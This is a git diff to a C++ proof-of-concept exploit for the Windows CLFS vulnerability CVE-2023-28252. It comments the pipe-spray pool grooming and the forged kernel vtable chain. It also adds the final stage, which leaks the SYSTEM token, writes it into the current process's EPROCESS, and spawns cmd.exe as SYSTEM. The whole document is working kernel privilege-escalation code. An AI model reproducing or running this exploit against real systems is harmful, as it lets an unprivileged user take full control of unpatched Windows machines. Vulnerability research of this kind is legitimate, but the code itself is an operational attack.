@@ -1,7 +1,7 @@
 /*
  * @Date: 2026-11-09 08:47:06
  * @LastEditors: joe1sn joe1sn23333@gmail.com
- * @LastEditTime: 2026-11-11 20:07:42
+ * @LastEditTime: 2026-11-12 14:09:22
  * @FilePath: \CVE_2023_28252\exp\CVE_2023_28252\poc.cpp
  */
 #include "poc.hpp"
@@ -97,6 +97,9 @@ namespace CVE_2023_28252
         fs.write(RecordOffset12, sizeof(RecordOffset12));
         //pBlockHeader->RecordOffsets[12] = 0x369;
         //CLFS_BASE_RECORD_HEADER* pBaseRecord = (CLFS_BASE_RECORD_HEADER*)(fileBuffer + 0x870);
+        //recordOffset = index_overflow_here->RecordOffsets[0] = 0x30+0x369=0x399;
+        //++*(CLFS + recordOffset) = ++*(CLFS + 0x399) 
+        // rgContainers[0] 的第二字节 +1，即 rgContainers[0]+=0x100;
 
         fs.seekp(0x1dd0);
         fs.write(data1, sizeof(data1));// offset 0x1dd0
@@ -109,31 +112,31 @@ namespace CVE_2023_28252
 
         //CLFS_CONTAINER_CONTEXT* pFakeCtx1 = (CLFS_CONTAINER_CONTEXT*)(fileBuffer + 0x1DE0);
         fs.seekp(0x1de0);
-        fs.write(data3, sizeof(data3)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data3, sizeof(data3));
 
         fs.seekp(0x20b8);
-        fs.write(data7, sizeof(data7)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data7, sizeof(data7));
 
         fs.seekp(0x20bc);
-        fs.write(data6, sizeof(data6)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data6, sizeof(data6));
 
         fs.seekp(0x20c8);
-        fs.write(data3, sizeof(data3)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data3, sizeof(data3));
 
         fs.seekp(0x20cc);
-        fs.write(data4, sizeof(data4)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data4, sizeof(data4));
 
         fs.seekp(0x20e0);
-        fs.write(data5, sizeof(data5)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
+        fs.write(data5, sizeof(data5)); // 0x05000000（用户态伪造对象）offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
 
         fs.seekp(0x1de4);
         fs.write(data4, sizeof(data4)); // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)
 
         fs.seekp(0x1df8);
-        fs.write(data5, sizeof(data5)); // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer
+        fs.write(data5, sizeof(data5)); //0x05000000（用户态伪造对象）  offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer 
 
         fs.seekp(0x8258);
-        fs.write(RecordOffset12, sizeof(RecordOffset12)); // offset 0x8258 RecordOffset[12d] to 0x369// offset 0x858 RecordOffset[12d] to 0x369
+        fs.write(RecordOffset12, sizeof(RecordOffset12)); // offset 0x8258 RecordOffset[12d] to 0x369
 
         fs.seekp(0x97d0);
         fs.write(data1, sizeof(data1));// offset 0x97d0 to 0x15a0
@@ -345,15 +348,13 @@ namespace CVE_2023_28252
             printf("[!] Warning: found multiple (%d) new chunks, race condition?\n", newChunkCount);
             exit(0);
         }
-        getchar();
 
         //4.实例化数据，确保数据驻留在内存中，后续伪造会继续使用这个container中的相关数据
-        //  在内核激活该容器
+        //  在内核激活该容器，确保后续溢出时使用的 pContainer 有效
         LONGLONG pcbContainer = 512;
         if (!AddLogContainer(hTFile, (PULONGLONG)&pcbContainer, (LPWSTR)tContainerPath.c_str(), 0))
         {
             CloseHandle(hTFile);
-            // printf("AddLogContainer Fail, please delete C:\\Users\\Public\\MyLxg_xxx.blf and try again\n");
             std::wcout << L"[x] AddLogContainer Fail, please delete " << tFilePath << " and try again\n";
             exit(1);
         }
@@ -393,8 +394,6 @@ namespace CVE_2023_28252
                 printf("copy error: 0x%x\n", (unsigned int)error);
                 exit(-1);
             }
-
-            // fun_trigger(stored_log_arrays[i], stored_fopen_arrays[i]);
             craftSprayFile(oobFilePath[i]);
             fixCRCFile(oobFilePath[i]);
         }
@@ -403,19 +402,9 @@ namespace CVE_2023_28252
         HANDLE _hthread = GetCurrentThread();//将当前线程锁定在CPU_0，增大喷射后的填充概率
         SetThreadAffinityMask(_hthread, 1);
 
-        UINT64 arrayCLFSkernelAddress[12] = { 0 };
-        arrayCLFSkernelAddress[0] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[1] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[2] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[3] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[4] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[5] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[6] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[7] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[8] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[9] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[10] = CLFS_kernelAddrArray + 0x30;
-        arrayCLFSkernelAddress[11] = CLFS_kernelAddrArray + 0x30;
+        UINT64 arrayCLFSkernelAddress[12] = { 0 }; //0x60 
+        for (size_t i = 0; i < 12; i++)
+            arrayCLFSkernelAddress[i] = CLFS_kernelAddrArray + 0x30;
 
         std::vector<pairPipe> pipesA, pipesB;
         for (size_t i = 0; i < 0x5000; i++)
@@ -427,7 +416,6 @@ namespace CVE_2023_28252
             }
             pipesA.push_back(temp);
         }
-
         for (size_t i = 0; i < 0x4000; i++)
         {
             pairPipe temp = {};
@@ -441,7 +429,7 @@ namespace CVE_2023_28252
         DWORD byteswritten;
         for (size_t i = 0; i < 0x5000; i++)
         {
-            if (!WriteFile(pipesA[i].w, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))
+            if (!WriteFile(pipesA[i].w, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))//0x60 + 0x30 = 0x90
             {
                 std::cout << "[!] Grooming pool failed\n";
                 exit(1);
@@ -510,17 +498,24 @@ namespace CVE_2023_28252
         *(UINT64*)dest2 = system_EPROCESS_high;
         *(UINT64*)dest3 = 0x414141414141005A;
 
-
-        getchar();
+        ULONG_PTR systemTokenValue;
+        bool foundSysToken = false;
         for (size_t i = 0; i < 10; i++)
         {
             std::cout << "[*] " << i << " Time to try================================\n";
             std::cout << "[+] Start trigger vuln\n";
-            // getchar();
             AddLogContainer(oobFile[i], (PULONGLONG)&pcbContainer2, (LPWSTR)oobContainerPath[i].c_str(), 0);// AddLogContainer
             std::cout << "[+] Out of Boundary just happend\n";
-            *(UINT64*)0x5000040 = 0x5000000;
-            *(UINT64*)0x5000000 = 0x5001000;
+            *(UINT64*)0x5000000 = 0x5001000; // vftable
+            *(UINT64*)0x5000040 = 0x5000000; // 自指针（必须非零）。PoFxProcessorNotification 拿到
+            *(UINT64*)0x5000048 = 0x5000400; // 递交给下一跳的"参数"。PoFxProcessorNotification 跳到自己
+            *(UINT64*)0x5000068 = fnClfsMgmtDeregisterManagedClient; //第三跳的目标函数指针。"将要跳转的地址在后 0x68 处"，
+            *(UINT64*)0x5000400 = 0x5001300; //第二张伪 vtable 指针 0x5001300
+            *(UINT64*)0x5000448 = para_PipeAttributeobjInkernel + 0x18; // "写入目标指针"。SeSetAccessStateGenericMapping 最终把
+            // GenericMapping 数据写到 **(AccessState+0x48) 处（"目标是位于 0x5000400+0x48
+            // 的指针所指处"）。第一次迭代填管道属性对象内部 +0x18 —— 那里存着指向
+            // 我准备的 "A" 缓冲区指针，写坏后可以用 NtFsControlFile 读回属性来验证
+
             *(UINT64*)0x5001000 = fnClfsEarlierLsn;
             *(UINT64*)0x5001008 = fnPoFxProcessorNotification;
             *(UINT64*)0x5001010 = fnClfsEarlierLsn;
@@ -530,24 +525,49 @@ namespace CVE_2023_28252
             *(UINT64*)0x5001030 = fnClfsEarlierLsn;
             *(UINT64*)0x5001038 = fnClfsEarlierLsn;
             *(UINT64*)0x5001040 = fnClfsEarlierLsn;
-            *(UINT64*)0x5000068 = fnClfsMgmtDeregisterManagedClient;
-            *(UINT64*)0x5000048 = 0x5000400;
-            *(UINT64*)0x5000400 = 0x5001300;
-            *(UINT64*)0x5000448 = para_PipeAttributeobjInkernel + 0x18;
             *(UINT64*)0x5001328 = fnClfsEarlierLsn;
             *(UINT64*)0x5001308 = fnSeSetAccessStateGenericMapping;
-            // getchar();
+
             std::cout << "[+] Next is using vuln\n";
             auto handle = CreateLogFile(tLogFilePath.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);
             CloseHandle(handle);
 
             NtFsControlFile(g_VictimPipes.w, 0, 0, 0, &status_block, 0x110038, &const_0x5a, 2, temp_chunk, 0x2000);
-            // auto systemTokenValue = *(UINT64*)((UINT64)offset + (UINT64)temp_chunk);
-            ULONG_PTR systemTokenValue = *(ULONG_PTR*)(temp_chunk + offset);
-            printf("[+] System Token Value: 0x%p\n", systemTokenValue);
-            exploit::memtools::hexdump(temp_chunk + offset - 0x10, 0x50);
-
+            systemTokenValue = *(ULONG_PTR*)(temp_chunk + offset);
+            if (systemTokenValue > 0x8181818181818181) {
+                exploit::memtools::hexdump(temp_chunk + offset - 0x10, 0x50);
+                foundSysToken = true;
+                break;
+            }
         }
+        printf("[+] System Token Value: 0x%p\n", systemTokenValue);
+
+
+
+        if (!foundSysToken) {
+            delete[] temp_chunk;
+            return;
+        }
+
+        ULONG_PTR selfEProcessAddr;
+        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
+        exploit::memtools::bFindHandleObject(GetCurrentProcessId(), (ULONG_PTR)hProc, (ULONG_PTR)(&selfEProcessAddr));
+        printf("[+] PoC Eprocess Address: 0x%p\n", selfEProcessAddr);
+
+        *(UINT64*)0xFFFFFFFF = *(UINT64*)(offset + (UINT64)temp_chunk);// system token write content
+        *(UINT64*)0x100000007 = systemTokenValue;
+        *(UINT64*)0x5000448 = selfEProcessAddr + exploit::gadget::X_22621_1105::tokenToEporcessOffset - 8;// target wire address
+        CreateLogFile(tLogFilePath.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);
+        std::cout << "[+] Enjoy your shell\n";
+        system("cmd.exe");
+
+
+        // restore
+        std::cout << "[+] Now fix to orign\n";
+        *(UINT64*)0xFFFFFFFF = 0x1458;
+        *(UINT64*)0x100000007 = 0164;
+        *(UINT64*)0x5000448 = CLFS_kernelAddrArray + 0x390;
+        CreateLogFile(tLogFilePath.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);
 
         delete[] temp_chunk;
     }
